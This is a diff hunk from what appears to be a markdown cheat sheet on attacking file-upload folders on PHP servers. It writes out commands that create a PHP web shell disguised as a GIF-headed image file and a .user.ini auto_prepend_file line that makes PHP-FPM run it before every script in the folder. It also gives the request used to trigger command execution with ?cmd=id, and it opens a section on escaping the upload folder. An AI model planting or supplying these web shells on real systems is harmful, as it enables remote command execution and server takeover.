@@ -31,7 +31,7 @@ printf 'GIF89a;\n<?php system($_GET["cmd"]); ?>' > shell.jpg
 PHP-FPM, often behind nginx: shell.png run in front of every PHP file in the folder, within five minutes.
 echo 'auto_prepend_file=shell.png' > .user.ini
 printf 'GIF89a;\n<?php system($_GET["cmd"]); ?>' > shell.png
-- [ ] Then any .php in THE-FOLDER requested with ?cmd=id
+- [ ] Then THE-FOLDER/shell.jpg?cmd=id after the .htaccess, or any .php in THE-FOLDER with ?cmd=id after the .user.ini
 
 ## Out of the upload folder
 The filename in the request, when the folder does not run code:
